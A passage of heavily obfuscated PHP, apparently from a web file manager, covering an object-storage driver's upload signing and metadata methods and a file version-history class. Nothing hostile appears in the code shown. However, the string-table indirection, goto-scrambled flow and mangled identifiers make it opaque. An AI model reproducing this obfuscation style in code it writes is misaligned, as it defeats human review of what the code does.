$fåÊêçµÚÏ =& $_SERVER[™⁄»üÆ]; $CòáõìäÙ£ = $this->objectMeta($eƒ“∞À’œ∑); if (!$CòáõìäÙ£) { return !1; } $föÇÈ∏Ãˆ√ = $föÇÈ∏Ãˆ√ ? $föÇÈ∏Ãˆ√ : _get($CòáõìäÙ£, $fåÊêçµÚÏ[219]); $föÇÈ∏Ãˆ√ = $föÇÈ∏Ãˆ√ ? $föÇÈ∏Ãˆ√ : _get($CòáõìäÙ£, $fåÊêçµÚÏ[209], $fåÊêçµÚÏ[33]); return $föÇÈ∏Ãˆ√; } public function uploadFormData($Aû÷êÌíûÛ, $Cﬂ⁄ÊË“ãê = 3600) { $E“æô√√üÏ =& $_SERVER[™⁄»üÆ]; $EÆâÌ¿ê¶ª = $this->pathFather($Aû÷êÌíûÛ); $c‚˘êüñ∑Ù = $this->client->getHttpUploadPostParams($this->bucket, $EÆâÌ¿ê¶ª, $E“æô√√üÏ[192], $Cﬂ⁄ÊË“ãê); return array_merge((array) $c‚˘êüñ∑Ù, array($E“æô√√üÏ[175] => $this->getHost())); } public function multiUploadFormData($fÜë◊ŸØå∏, $aÓµÈ†à…¡ = 3600) { $D£ÆÑìì®Ü =& $_SERVER[™⁄»üÆ]; $cΩÃÔÉ˘Üµ = gmdate($D£ÆÑìì®Ü[220]); $c†‚ñËºØ† = array(); $FâêêëÂ‚º = $this->client->getUploadId($this->bucket, $fÜë◊ŸØå∏, $c†‚ñËºØ†); if (!$FâêêëÂ‚º) { return !1; } return array($D£ÆÑìì®Ü[221] => $FâêêëÂ‚º, $D£ÆÑìì®Ü[175] => $this->getHost() . $D£ÆÑìì®Ü[8] . $this->pathEncode($fÜë◊ŸØå∏), $D£ÆÑìì®Ü[222] => $cΩÃÔÉ˘Üµ, $D£ÆÑìì®Ü[93] => $fÜë◊ŸØå∏); } public function multiUploadAuthData($f‡‰◊ﬂÜÑÜ, $fÌó‰†Û œ = array()) { goto Eá™ÌŸ©…Ω; eç≈€ñ€Ÿß: $DÆ¶ïë√Êı = $fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[93]]; unset($fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[93]]); if (isset($fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[223]])) { $fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[222]] = $DÃù∑Ò®∂û; return $this->listUploadParts($DÆ¶ïë√Êı, $fÌó‰†Û œ); } goto Aëë€«µúê; Eá™ÌŸ©…Ω: $Få¢ÇÌÁ‰ú =& $_SERVER[™⁄»üÆ]; $DÃù∑Ò®∂û = isset($fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[222]]) ? $fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[222]] : gmdate($Få¢ÇÌÁ‰ú[220]); $FêéÆÕÜ∏Û = isset($fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[168]]) ? $fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[168]] : $Få¢ÇÌÁ‰ú[33]; goto eç≈€ñ€Ÿß; BÚ≥ÈûıÑê: $Dµ¶ô⁄åÒ© = implode($Få¢ÇÌÁ‰ú[229], $EÑÀãÓÖ”ç); $Fﬂå‹èÔ√¶ = base64_encode(hash_hmac($Få¢ÇÌÁ‰ú[230], $Dµ¶ô⁄åÒ©, $this->secret, !0)); $F©πÑ◊ùà° = $Få¢ÇÌÁ‰ú[231] . $this->accessKey . $Få¢ÇÌÁ‰ú[4] . $Fﬂå‹èÔ√¶; goto a´ü„Ãñ≤; a´ü„Ãñ≤: if (strpos($FêéÆÕÜ∏Û, $Få¢ÇÌÁ‰ú[225]) === 0) { return array($Få¢ÇÌÁ‰ú[232] => $F©πÑ◊ùà°, $Få¢ÇÌÁ‰ú[222] => $DÃù∑Ò®∂û); } return $F©πÑ◊ùà°; goto d’À±◊ÏˆË; Aëë€«µúê: $EÑÀãÓÖ”ç = array($Få¢ÇÌÁ‰ú[224], $Få¢ÇÌÁ‰ú[33], $Få¢ÇÌÁ‰ú[119], $Få¢ÇÌÁ‰ú[33], "\170\55\141\155\172\55\144\x61\164\145\x3a{$DÃù∑Ò®∂û}", $Få¢ÇÌÁ‰ú[8] . $this->bucket . $Få¢ÇÌÁ‰ú[8] . $this->pathEncode($DÆ¶ïë√Êı) . $FêéÆÕÜ∏Û); if (strpos($FêéÆÕÜ∏Û, $Få¢ÇÌÁ‰ú[225]) === 0) { $EÑÀãÓÖ”ç[0] = $Få¢ÇÌÁ‰ú[226]; } if (isset($fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[227]]) && $fÌó‰†Û œ[$Få¢ÇÌÁ‰ú[227]] == $Få¢ÇÌÁ‰ú[228]) { $EÑÀãÓÖ”ç[0] = $Få¢ÇÌÁ‰ú[228]; } goto BÚ≥ÈûıÑê; d’À±◊ÏˆË: } public function listUploadParts($Eï≈¯–áä·, $D≈ëî°Ûπè = array()) { goto CÒç⁄ÿ±ö¥; E˘ºƒ˘À± : $Fë‰¥ÒÙ”õ = $this->multiUploadAuthData($Eï≈¯–áä·, $D≈ëî°Ûπè); if (empty($Fë‰¥ÒÙ”õ)) { return !1; } return array($aäÎÎÔ∑ê”[232] => $Fë‰¥ÒÙ”õ, $aäÎÎÔ∑ê”[222] => $D≈ëî°Ûπè[$aäÎÎÔ∑ê”[222]], $aäÎÎÔ∑ê”[234] => $c√Ï«ÁÕ¨…); goto E¯È€¿ÔÿÎ; a∑•Ãµ£òÔ: if (!$c√Ï«ÁÕ¨…) { return !1; } unset($D≈ëî°Ûπè[$aäÎÎÔ∑ê”[223]], $D≈ëî°Ûπè[$aäÎÎÔ∑ê”[227]]); $D≈ëî°Ûπè[$aäÎÎÔ∑ê”[93]] = $Eï≈¯–áä·; goto E˘ºƒ˘À± ; CÒç⁄ÿ±ö¥: $aäÎÎÔ∑ê” =& $_SERVER[™⁄»üÆ]; $AÛÆΩÜÑó± = str_replace($aäÎÎÔ∑ê”[233], $aäÎÎÔ∑ê”[33], $D≈ëî°Ûπè[$aäÎÎÔ∑ê”[168]]); $c√Ï«ÁÕ¨… = $this->client->listParts($this->bucket, $Eï≈¯–áä·, $AÛÆΩÜÑó±); goto a∑•Ãµ£òÔ; E¯È€¿ÔÿÎ: } public function getHost() { return parent::getHost() . $_SERVER[™⁄»üÆ][8] . $this->bucket; } public function size($aøªƒéë†ï) { $BÑ⁄Æ”¨é≥ = $this->objectMeta($aøªƒéë†ï); return $BÑ⁄Æ”¨é≥ ? $BÑ⁄Æ”¨é≥[$_SERVER[™⁄»üÆ][78]] : 0; } public function info($AﬁàÏ¥ëçÚ) { if ($this->isFolder($AﬁàÏ¥ëçÚ)) { return $this->folderInfo($AﬁàÏ¥ëçÚ); } else { if ($this->isFile($AﬁàÏ¥ëçÚ)) { return $this->fileInfo($AﬁàÏ¥ëçÚ); } } return !1; } public function exist($BéÇ◊’˘®≈) { return $this->isFile($BéÇ◊’˘®≈) || $this->isFolder($BéÇ◊’˘®≈); } public function isFile($d≈ÆıéÌÈî) { return !$this->isFolder($d≈ÆıéÌÈî) && $this->objectMeta($d≈ÆıéÌÈî); } public function isFolder($C°–Ñ·ÑÆø) { return $this->cacheMethod($_SERVER[™⁄»üÆ][199], $C°–Ñ·ÑÆø); } protected function objectMeta($dÃÉÿÚá £) { return $this->cacheMethod($_SERVER[™⁄»üÆ][200], $dÃÉÿÚá £); } protected function _objectMeta($FÉÉÛøãÇ›) { $A≤‚°øáóı =& $_SERVER[™⁄»üÆ]; $FÉÉÛøãÇ› = rtrim($FÉÉÛøãÇ›, $A≤‚°øáóı[8]); try { $DœÒèèí¨ = $this->client->getObjectInfo($this->bucket, $FÉÉÛøãÇ›); if (!isset($DœÒèèí¨[$A≤‚°øáóı[219]]) && isset($DœÒèèí¨[$A≤‚°øáóı[235]])) { $DœÒèèí¨[$A≤‚°øáóı[219]] = $DœÒèèí¨[$A≤‚°øáóı[235]]; } } catch (Exception $Fç˘âÊà°á) { $DœÒèèí¨ = !1; } if (!$DœÒèèí¨) { } return $DœÒèèí¨; } protected function _isFolder($C›Ω“Œ≈Ø√) { goto fÔ⁄âÇáõ; Cƒ«¡ùÌ±ê: return !0; goto eÂÉÑ≠éÁ◊; fÔ⁄âÇáõ: $BÓ´óÏ€¢… =& $_SERVER[™⁄»üÆ]; $C›Ω“Œ≈Ø√ = rtrim($C›Ω“Œ≈Ø√, $BÓ´óÏ€¢…[8]); if ($C›Ω“Œ≈Ø√ == $BÓ´óÏ€¢…[33] || $C›Ω“Œ≈Ø√ == $BÓ´óÏ€¢…[8]) { return !0; } goto a»ú¨í∏ƒª; a»ú¨í∏ƒª: $Fë§í∆≈„— = $this->client->getBucket($this->bucket, $C›Ω“Œ≈Ø√, null, 1); if (empty($Fë§í∆≈„—[$BÓ´óÏ€¢…[198]])) { return !1; } $D‹ää≈≥†± = $Fë§í∆≈„—[$BÓ´óÏ€¢…[198]][0][$BÓ´óÏ€¢…[28]]; goto F‘ıßå•ö¨; F‘ıßå•ö¨: return stripos($D‹ää≈≥†±, $C›Ω“Œ≈Ø√ . $BÓ´óÏ€¢…[8]) === 0 ? !0 : !1; if (substr($D‹ää≈≥†±, -1) == $BÓ´óÏ€¢…[8]) { return !0; } if (get_path_this($D‹ää≈≥†±) == get_path_this($C›Ω“Œ≈Ø√)) { return !1; } goto Cƒ«¡ùÌ±ê; eÂÉÑ≠éÁ◊: } } define($_SERVER[™⁄»üÆ][236], 1); goto Cà»Û§¢®Œ; e¯áƒÜπêè: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto f‘ê˘Ìã˜Õ; b∞¿⁄ñ¡¨Û: Hook::bind($E∑˜ÊËØùÇ[1122], $E∑˜ÊËØùÇ[1123]); Hook::bind($E∑˜ÊËØùÇ[1124], $E∑˜ÊËØùÇ[1125]); goto A‹òåÙ¥Êç; b…∑ÿﬂ˜Õ∑: if ($a©∏‘ùÂº∂[$E∑˜ÊËØùÇ[1112]] <= 0) { return; } if (isset($_REQUEST[$E∑˜ÊËØùÇ[1113]]) && $_REQUEST[$E∑˜ÊËØùÇ[1113]] == $E∑˜ÊËØùÇ[87]) { return; } Hook::bind($E∑˜ÊËØùÇ[1114], $E∑˜ÊËØùÇ[1115]); goto EΩƒ…√¥º√; EΩƒ…√¥º√: Hook::bind($E∑˜ÊËØùÇ[1116], $E∑˜ÊËØùÇ[1117]); Hook::bind($E∑˜ÊËØùÇ[1118], $E∑˜ÊËØùÇ[1119]); Hook::bind($E∑˜ÊËØùÇ[1120], $E∑˜ÊËØùÇ[1121]); goto b∞¿⁄ñ¡¨Û; f‘ê˘Ìã˜Õ: $E∑˜ÊËØùÇ =& $_SERVER[™⁄»üÆ]; $a©∏‘ùÂº∂ = $GLOBALS[$E∑˜ÊËØùÇ[6]][$E∑˜ÊËØùÇ[88]]; if ($a©∏‘ùÂº∂[$E∑˜ÊËØùÇ[1111]] != 1) { return; } goto b…∑ÿﬂ˜Õ∑; A‹òåÙ¥Êç: } public static function eventBeforeUpload($FÛá¿“á√ô) { if ($FÛá¿“á√ô[3] && $FÛá¿“á√ô[3] != REPEAT_REPLACE) { return; } $aøëé≠ﬂπÃ = self::parsePath($FÛá¿“á√ô[0]); if (!$aøëé≠ﬂπÃ) { return; } self::add($aøëé≠ﬂπÃ); } public static function eventBeforeEdit($Bçªä›ò∑©) { $EîâŒ√∏Ü’ = self::parsePath($Bçªä›ò∑©[0]); if (!$EîâŒ√∏Ü’) { return; } self::add($EîâŒ√∏Ü’); } public static function eventBeforeCopyFile($bùË‚àÇ¡–, $c÷¥π ªÃ‰, $aØÀÛ⁄û≤Ê, $aí˜È›™¯Ç, $aˆãı∏Ùúù, $DÉƒßÀ´é«) { $Fûû¥çÊ˜Ñ = $aØÀÛ⁄û≤Ê->getPathOuter($aí˜È›™¯Ç); $f˘ñ•ÜâéÑ = self::parsePath($Fûû¥çÊ˜Ñ); if (!$f˘ñ•ÜâéÑ) { return; } self::add($f˘ñ•ÜâéÑ); } public static function eventBeforeRename($bäêöî–ºé) { $cÿ≠¢Ö´Û =& $_SERVER[™⁄»üÆ]; $A®Òñ◊ä•è = self::parsePath($bäêöî–ºé[0]); if (!$A®Òñ◊ä•è) { return; } $aô÷†‚÷¯œ = self::checkInHistory($A®Òñ◊ä•è); if (!$aô÷†‚÷¯œ) { return; } if ($aô÷†‚÷¯œ[$cÿ≠¢Ö´Û[29]] == $cÿ≠¢Ö´Û[193]) { $aÆ⁄±—§¿£ = self::listData($A®Òñ◊ä•è); if ($aÆ⁄±—§¿£ && $aÆ⁄±—§¿£[$cÿ≠¢Ö´Û[367]]) { self::moveHistory($A®Òñ◊ä•è, $bäêöî–ºé[1]); } } else { IO::rename($aô÷†‚÷¯œ[$cÿ≠¢Ö´Û[76]], $bäêöî–ºé[1]); } } public static function eventBeforeMove($fÉÇ„Û¯ÇÖ) { goto e·Üåö•◊¯; e·Üåö•◊¯: $E≤õ¡˘ÙÆÜ =& $_SERVER[™⁄»üÆ]; $eΩÉ‚ì’ä„ = self::parsePath($fÉÇ„Û¯ÇÖ[0]); if (!$eΩÉ‚ì’ä„) { return; } goto AŒ»µñ¨⁄á; a“Ûî„€îÃ: $aÜèß¯òé = self::checkInHistory($eΩÉ‚ì’ä„); if (!$aÜèß¯òé) { return; } $FÀ•åˆ˜Æ‘ = self::pathHistory($bÔ–¯û∞ÍÚ); goto eÇé∆çï∑√; eÇé∆çï∑√: if ($aÜèß¯òé[$E≤õ¡˘ÙÆÜ[29]] == $E≤õ¡˘ÙÆÜ[193]) { $AÉúÆ’ƒ»ç = self::listData($eΩÉ‚ì’ä„); $Cñüîã£Œ¨ = rtrim($bÔ–¯û∞ÍÚ, $E≤õ¡˘ÙÆÜ[8]) . $E≤õ¡˘ÙÆÜ[8] . ($B‚…Ìàﬂ∑º ? $B‚…Ìàﬂ∑º : get_path_this($eΩÉ‚ì’ä„)); $B¿ìﬂÊŒå¬ = self::listData($Cñüîã£Œ¨); if ($AÉúÆ’ƒ»ç && $AÉúÆ’ƒ»ç[$E≤õ¡˘ÙÆÜ[367]] && $B¿ìﬂÊŒå¬ && $B¿ìﬂÊŒå¬[$E≤õ¡˘ÙÆÜ[367]]) { return self::clear($eΩÉ‚ì’ä„); } if ($AÉúÆ’ƒ»ç && $AÉúÆ’ƒ»ç[$E≤õ¡˘ÙÆÜ[367]]) { self::moveHistory($eΩÉ‚ì’ä„, $B‚…Ìàﬂ∑º, $FÀ•åˆ˜Æ‘); } } else { IO::move($aÜèß¯òé[$E≤õ¡˘ÙÆÜ[76]], $FÀ•åˆ˜Æ‘, !1, $B‚…Ìàﬂ∑º); self::clearEmptyFolder(IO::pathFather($aÜèß¯òé[$E≤õ¡˘ÙÆÜ[76]])); } goto D»Ö∞øä∏–; AŒ»µñ¨⁄á: $bÔ–¯û∞ÍÚ = self::parsePath($fÉÇ„Û¯ÇÖ[1]); if (!$bÔ–¯û∞ÍÚ) { return; } $B‚…Ìàﬂ∑º = $fÉÇ„Û¯ÇÖ[3]; goto a“Ûî„€îÃ; D»Ö∞øä∏–: } public static function eventAfterRemove($c€¬¬àÒúÉ, $EÉÌ —Ì„“) { goto døòû‡ﬁÿ; FêÓÖŒç±€: if ($b÷¶ƒ®À©à[$CÒ˜«É∞Ωï[29]] == $CÒ˜«É∞Ωï[193]) { $FıåƒÌ˜ª = self::listData($AîÑ∏Æ±Ùº, !1); if ($FıåƒÌ˜ª && $FıåƒÌ˜ª[$CÒ˜«É∞Ωï[367]]) { self::clear($AîÑ∏Æ±Ùº, !1); } } else { IO::remove($b÷¶ƒ®À©à[$CÒ˜«É∞Ωï[76]]); self::clearEmptyFolder(IO::pathFather($b÷¶ƒ®À©à[$CÒ˜«É∞Ωï[76]])); } goto Eò«¶®Ô’´; døòû‡ﬁÿ: $CÒ˜«É∞Ωï =& $_SERVER[™⁄»üÆ]; if (!$EÉÌ —Ì„“) { return; } $AîÑ∏Æ±Ùº = self::parsePath($c€¬¬àÒúÉ[0]); goto E¬¶ √˘©Ø; E¬¶ √˘©Ø: if (!$AîÑ∏Æ±Ùº) { return; } $b÷¶ƒ®À©à = self::checkInHistory($AîÑ∏Æ±Ùº); if (!$b÷¶ƒ®À©à) { return; } goto FêÓÖŒç±€; Eò«¶®Ô’´: } private static function checkInHistory($cä¶œËÃüÈ) { $bŒ…Â®∂‰ä = self::pathHistory($cä¶œËÃüÈ); if (!IO::exist($bŒ…Â®∂‰ä)) { $bŒ…Â®∂‰ä .= $_SERVER[™⁄»üÆ][1126]; } return IO::exist($bŒ…Â®∂‰ä) ? IO::info($bŒ…Â®∂‰ä) : !1; } private static function parsePath($C†—è≠”¡ä) { goto AÊ≥”◊Ù≠ü; b ÁäÖ˜›∂: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $cãéΩÆäˆç = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $d›äÓ‡¬ß›[1130]); foreach ($cãéΩÆäˆç as $f’¨ìÍæê») { if (!$fΩ¿øÍúÜ∂ && substr($C†—è≠”¡ä, 0, strlen($f’¨ìÍæê»)) == $f’¨ìÍæê») { return !1; } } goto F¥ÆÜ‚Ìù¯; F¥ÆÜ‚Ìù¯: self::log($GLOBALS[$d›äÓ‡¬ß›[1051]] . $d›äÓ‡¬ß›[1131] . $C†—è≠”¡ä); return $C†—è≠”¡ä; goto cÇ£Â°ÉÂ•; C¯±ŸÜå©˘: if (!$A©ÏâÆå∂¢ || !$E¡∞–úØÍè[$d›äÓ‡¬ß›[1128]]) { return !1; } if (substr($C†—è≠”¡ä, 0, strlen(DATA_PATH . $d›äÓ‡¬ß›[1129])) == DATA_PATH . $d›äÓ‡¬ß›[1129]) { return !1; } if ($fΩ¿øÍúÜ∂ == KodIO::KOD_SHARE_ITEM) { $B› ‚µΩÏ∏ = IO::init($C†—è≠”¡ä); if ($B› ‚µΩÏ∏->pathParse[$d›äÓ‡¬ß›[1056]]) { return self::parsePath($B› ‚µΩÏ∏->pathParse[$d›äÓ‡¬ß›[1056]]); } return !1; } goto b ÁäÖ˜›∂; C…ı¥⁄∞”Â: $E¡∞–úØÍè = KodIO::parse($C†—è≠”¡ä); $fΩ¿øÍúÜ∂ = $E¡∞–úØÍè[$d›äÓ‡¬ß›[29]]; $A©ÏâÆå∂¢ = !$fΩ¿øÍúÜ∂ || $fΩ¿øÍúÜ∂ == KodIO::KOD_IO || $fΩ¿øÍúÜ∂ == KodIO::KOD_SHARE_ITEM; goto C¯±ŸÜå©˘; AÊ≥”◊Ù≠ü: $d›äÓ‡¬ß› =& $_SERVER[™⁄»üÆ]; if (!$C†—è≠”¡ä) { return !1; } if ($GLOBALS[$d›äÓ‡¬ß›[1127]]) { return; } goto C…ı¥⁄∞”Â; cÇ£Â°ÉÂ•: } private static function pathHistory($bíﬁ¨âîÎû) { $A±ô≠—î…Õ =& $_SERVER[™⁄»üÆ]; $FØ‡ÓÃä´¬ = self::$_historyBase . ltrim(KodIO::clear($bíﬁ¨âîÎû), $A±ô≠—î…Õ[8]); $FØ‡ÓÃä´¬ = str_replace(array($A±ô≠—î…Õ[1132]), array($A±ô≠—î…Õ[1133]), $FØ‡ÓÃä´¬); return $FØ‡ÓÃä´¬; } public static function log($E›–…ô’áë) { } public static function historyCount($cÛùÃã∑¶⁄) { $D⁄∂à·Õà´ =& $_SERVER[™⁄»üÆ]; $cÉˆÉéÆΩú = array(); $C§Ú·’Øÿé = array(); foreach ($cÛùÃã∑¶⁄ as $Cêçı«ê¯¥) { $dî–à•£ÑÍ = get_path_father($Cêçı«ê¯¥); if (!$C§Ú·’Øÿé[$dî–à•£ÑÍ]) { $C§Ú·’Øÿé[$dî–à•£ÑÍ] = array(); } $C§Ú·’Øÿé[$dî–à•£ÑÍ][] = get_path_this($Cêçı«ê¯¥); } foreach ($C§Ú·’Øÿé as $dî–à•£ÑÍ => $aÆˆâØ§ºò) { $aÉÖ›œ±ç¨ = self::parsePath($dî–à•£ÑÍ); if (!$aÉÖ›œ±ç¨) { continue; } foreach ($aÆˆâØ§ºò as $Fü…¥÷ºŸ∫) { $Dê‚∂Ù±·‰ = self::listData(rtrim($aÉÖ›œ±ç¨, $D⁄∂à·Õà´[8]) . $D⁄∂à·Õà´[8] . $Fü…¥÷ºŸ∫, !1); if ($Dê‚∂Ù±·‰ && $Dê‚∂Ù±·‰[$D⁄∂à·Õà´[367]]) { $cÉˆÉéÆΩú[rtrim($dî–à•£ÑÍ, $D⁄∂à·Õà´[8]) . $D⁄∂à·Õà´[8] . $Fü…¥÷ºŸ∫] = count($Dê‚∂Ù±·‰[$D⁄∂à·Õà´[367]]); } } } return $cÉˆÉéÆΩú; } public static function add($DôƒÇÛÕ≠”) { goto CÈ·ÛÃä°â; B∏Ë¬Àë◊›: $fœ»áÿ‹ÙÌ = $fÙÿÑ¡‰ƒµ[$Eæ≤ÜŸ‹àÈ[367]]; if ($dπﬁ§≤˘ìà[$Eæ≤ÜŸ‹àÈ[78]] == 0) { return; } if ($dπﬁ§≤˘ìà[$Eæ≤ÜŸ‹àÈ[78]] >= 1024 * 1024 * 500) { return !1; } goto F´á∞…Ã◊µ; FøèµæﬂÆ∆: if ($E≈èâæµ®© <= 0) { return; } $d®≠éäœà™ = IO::hashSimple($DôƒÇÛÕ≠”); $dπﬁ§≤˘ìà = IO::info($DôƒÇÛÕ≠”); goto B∏Ë¬Àë◊›; b∆®ò›◊Ò√: $aŸ◊»Ü•Ö€ = array($Eæ≤ÜŸ‹àÈ[394] => $eéÊÇ‘ˆ¿∂, $Eæ≤ÜŸ‹àÈ[171] => $d®≠éäœà™, $Eæ≤ÜŸ‹àÈ[28] => $dπﬁ§≤˘ìà[$Eæ≤ÜŸ‹àÈ[28]] . $Eæ≤ÜŸ‹àÈ[95] . date($Eæ≤ÜŸ‹àÈ[1136]) . rand_string(1), $Eæ≤ÜŸ‹àÈ[78] => $dπﬁ§≤˘ìà[$Eæ≤ÜŸ‹àÈ[78]], $Eæ≤ÜŸ‹àÈ[433] => USER_ID, $Eæ≤ÜŸ‹àÈ[194] => time(), $Eæ≤ÜŸ‹àÈ[1137] => $Eæ≤ÜŸ‹àÈ[33]); IO::mkdir($fÙÿÑ¡‰ƒµ[$Eæ≤ÜŸ‹àÈ[1138]]); $EùµÕâá©∏ = IO::copy($DôƒÇÛÕ≠”, $fÙÿÑ¡‰ƒµ[$Eæ≤ÜŸ‹àÈ[1138]], !1, $aŸ◊»Ü•Ö€[$Eæ≤ÜŸ‹àÈ[28]]); goto eπíπÓìÇ‰; F´á∞…Ã◊µ: if ($fœ»áÿ‹ÙÌ && $fœ»áÿ‹ÙÌ[0][$Eæ≤ÜŸ‹àÈ[171]] == $d®≠éäœà™) { return !0; } if (array_key_exists($Eæ≤ÜŸ‹àÈ[196], $dπﬁ§≤˘ìà) && !$dπﬁ§≤˘ìà[$Eæ≤ÜŸ‹àÈ[196]]) { return !1; } $eéÊÇ‘ˆ¿∂ = short_id(time()); goto b∆®ò›◊Ò√; CÈ·ÛÃä°â: $Eæ≤ÜŸ‹àÈ =& $_SERVER[™⁄»üÆ]; $fÙÿÑ¡‰ƒµ = self::listData($DôƒÇÛÕ≠”); if (!$fÙÿÑ¡‰ƒµ) { return; } goto dﬂ°√Û¡ˆ”; dà·®Í˜¿: return self::saveData($fÙÿÑ¡‰ƒµ[$Eæ≤ÜŸ‹àÈ[1139]], $fœ»áÿ‹ÙÌ); goto fïﬁÇÈˆ£å; eπíπÓìÇ‰: if (!$EùµÕâá©∏) { self::clearEmptyFolder($fÙÿÑ¡‰ƒµ[$Eæ≤ÜŸ‹àÈ[1138]]); return !1; } array_unshift($fœ»áÿ‹ÙÌ, $aŸ◊»Ü•Ö€); if (count($fœ»áÿ‹ÙÌ) > $Fè»¶Õéøà) { $c¡Ó õÙÏî = array_slice($fœ»áÿ‹ÙÌ, $Fè»¶Õéøà); foreach ($c¡Ó õÙÏî as $EÕ•˘ÙíßÃ) { IO::remove($fÙÿÑ¡‰ƒµ[$Eæ≤ÜŸ‹àÈ[1138]] . $EÕ•˘ÙíßÃ[$Eæ≤ÜŸ‹àÈ[28]]); } $fœ»áÿ‹ÙÌ = array_slice($fœ»áÿ‹ÙÌ, 0, $Fè»¶Õéøà); } goto dà·®Í˜¿; dﬂ°√Û¡ˆ”: $b¨‡£÷ûàñ = Model($Eæ≤ÜŸ‹àÈ[749])->get($Eæ≤ÜŸ‹àÈ[1134]); $E≈èâæµ®© = $GLOBALS[$Eæ≤ÜŸ‹àÈ[6]][$Eæ≤ÜŸ‹àÈ[88]][$Eæ≤ÜŸ‹àÈ[1112]]; $Fè»¶Õéøà = $b¨‡£÷ûàñ == $Eæ≤ÜŸ‹àÈ[1135] ? 5 : $E≈èâæµ®©; goto FøèµæﬂÆ∆; fïﬁÇÈˆ£å: } public static function remove($fÖ”ÒÉ≤á–, $F©®í‘ì¢ü) { $B¡¶¯ª§∞∂ =& $_SERVER[™⁄»üÆ]; $Bé•”∆áÖÖ = self::listData($fÖ”ÒÉ≤á–); $fâµãﬁàÁ∞ = array(); if (!$Bé•”∆áÖÖ) { return !1; } foreach ($Bé•”∆áÖÖ[$B¡¶¯ª§∞∂[367]] as $Bâûü‡Øéï) { if ($Bâûü‡Øéï[$B¡¶¯ª§∞∂[394]] == $F©®í‘ì¢ü) { IO::remove($Bé•”∆áÖÖ[$B¡¶¯ª§∞∂[1138]] . $Bâûü‡Øéï[$B¡¶¯ª§∞∂[28]]); continue; } $fâµãﬁàÁ∞[] = $Bâûü‡Øéï; } return self::saveData($Bé•”∆áÖÖ[$B¡¶¯ª§∞∂[1139]], $fâµãﬁàÁ∞); } public static function clear($Eıµ—’”Ì¥, $BØ¨∫Õ¿˜≥ = true) { $EåÇà¬ç»‰ =& $_SERVER[™⁄»üÆ]; $cÑò¶≈Ã≥ƒ = self::listData($Eıµ—’”Ì¥, $BØ¨∫Õ¿˜≥); if (!$cÑò¶≈Ã≥ƒ) { return !1; } foreach ($cÑò¶≈Ã≥ƒ[$EåÇà¬ç»‰[367]] as $C≠÷¶¿†úâ) { IO::remove($cÑò¶≈Ã≥ƒ[$EåÇà¬ç»‰[1138]] . $C≠÷¶¿†úâ[$EåÇà¬ç»‰[28]]); } return self::saveData($cÑò¶≈Ã≥ƒ[$EåÇà¬ç»‰[1139]], array()); } public static function moveHistory($aª¥´ØÇ Á, $a∞Éπ¯ÕÆì = '', $DπÖÏîöèï = '') { goto DüÓÊÑâœ„; DüÓÊÑâœ„: $DÖÏËãª∆å =& $_SERVER[™⁄»üÆ]; $A£’êÏ„πá = self::listData($aª¥´ØÇ Á, !1); if (!$A£’êÏ„πá || !$A£’êÏ„πá[$DÖÏËãª∆å[367]]) { return !1; } goto fåÜéìŸØ°; CﬂªÆòò°È: $a⁄”’≈à∏π = substr(get_path_this($A£’êÏ„πá[$DÖÏËãª∆å[1139]]), 0, -strlen($C∆á‘Ã”†≈)); foreach ($A£’êÏ„πá[$DÖÏËãª∆å[367]] as $F∆”é‹æÓÎ => $dΩÌ≠…ÈÎ∏) { $C†‰á»¶ë£ = $a∞Éπ¯ÕÆì . substr($dΩÌ≠…ÈÎ∏[$DÖÏËãª∆å[28]], strlen($a⁄”’≈à∏π)); $DÆÔﬂ¶ˆâŒ = IO::move($A£’êÏ„πá[$DÖÏËãª∆å[1138]] . $dΩÌ≠…ÈÎ∏[$DÖÏËãª∆å[28]], $DπÖÏîöèï, !1, $C†‰á»¶ë£); if ($DÆÔﬂ¶ˆâŒ) { $A£’êÏ„πá[$DÖÏËãª∆å[367]][$F∆”é‹æÓÎ][$DÖÏËãª∆å[28]] = $C†‰á»¶ë£; } } $A£’êÏ„πá[$DÖÏËãª∆å[1139]] = IO::move($A£’êÏ„πá[$DÖÏËãª∆å[1139]], $DπÖÏîöèï, !1, $a∞Éπ¯ÕÆì . $C∆á‘Ã”†≈); goto bÑè∂≤©äû; fåÜéìŸØ°: $C∆á‘Ã”†≈ = $DÖÏËãª∆å[1126]; $a∞Éπ¯ÕÆì = $a∞Éπ¯ÕÆì ? $a∞Éπ¯ÕÆì : get_path_this($aª¥´ØÇ Á); $DπÖÏîöèï = $DπÖÏîöèï ? $DπÖÏîöèï : $A£’êÏ„πá[$DÖÏËãª∆å[1138]]; goto CﬂªÆòò°È; bÑè∂≤©äû: self::saveData($A£’êÏ„πá[$DÖÏËãª∆å[1139]], $A£’êÏ„πá[$DÖÏËãª∆å[367]]); self::clearEmptyFolder($A£’êÏ„πá[$DÖÏËãª∆å[1138]]); goto e∂∞√»≤€é; e∂∞√»≤€é: } public static function rollback($dÕèéú∆ê , $AÚ¿º–˜∫∏) { $dœ≠ ê’Ï∏ =& $_SERVER[™⁄»üÆ]; $b¶Çü≥Î÷ß = self::listData($dÕèéú∆ê ); if (!$b¶Çü≥Î÷ß) { return; } $E…∏ç« ‚¡ = IO::info($dÕèéú∆ê ); foreach ($b¶Çü≥Î÷ß[$dœ≠ ê’Ï∏[367]] as $dÏÀûâÂí≤ => $e¯ãôãÆ≈∑) { if ($e¯ãôãÆ≈∑[$dœ≠ ê’Ï∏[394]] == $AÚ¿º–˜∫∏) { self::add($dÕèéú∆ê ); $c‡µª…à¬ú = $b¶Çü≥Î÷ß[$dœ≠ ê’Ï∏[1138]] . $e¯ãôãÆ≈∑[$dœ≠ ê’Ï∏[28]]; $eï«Ç“Ù¿” = IO::copy($c‡µª…à¬ú, IO::pathFather($dÕèéú∆ê ), REPEAT_REPLACE, $E…∏ç« ‚¡[$dœ≠ ê’Ï∏[28]]); if ($eï«Ç“Ù¿”) { self::remove($dÕèéú∆ê , $AÚ¿º–˜∫∏); } return $eï«Ç“Ù¿”; } } return !1; } public static function 